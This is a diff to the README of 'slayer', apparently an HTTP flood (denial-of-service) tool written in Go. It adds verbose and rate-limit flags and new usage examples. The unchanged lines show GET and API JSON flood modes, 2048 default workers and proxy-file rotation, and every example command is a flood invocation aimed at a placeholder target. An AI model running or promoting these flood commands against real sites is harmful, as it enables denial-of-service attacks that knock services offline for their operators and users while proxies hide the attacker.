@@ -38,7 +38,7 @@ go build -o slayer .
 ##  Usage
 
 ```bash
-slayer -t <url> [-m method] [-w workers] [-d duration] [-p proxyfile]
+slayer -t <url> [-m method] [-w workers] [-d duration] [-p proxyfile] [-v] [-r ms]
 ```
 
 ### Flags
@@ -50,6 +50,8 @@ slayer -t <url> [-m method] [-w workers] [-d duration] [-p proxyfile]
 | `-w` | `2048`       | Number of concurrent workers            |
 | `-d` | `30`         | Duration (seconds)                      |
 | `-p` | *(none)*     | Proxy file path (omit for direct mode)  |
+| `-v` | `false`      | Print request errors to stderr          |
+| `-r` | `0`          | Delay in ms between requests per worker (0 = unlimited) |
 
 ---
 
@@ -83,6 +85,12 @@ golang.org/x/net/http2/hpack
 
 # API JSON flood
 ./slayer -t https://target.com -m apiflood -w 2048 -d 90
+
+# Rate-limited GET flood (max ~100 RPS across 10 workers)
+./slayer -t https://target.com -m httpget -w 10 -d 60 -r 100
+
+# Verbose mode — print errors to stderr while running
+./slayer -t https://target.com -m httpget -d 30 -v
 ```
 
 ---
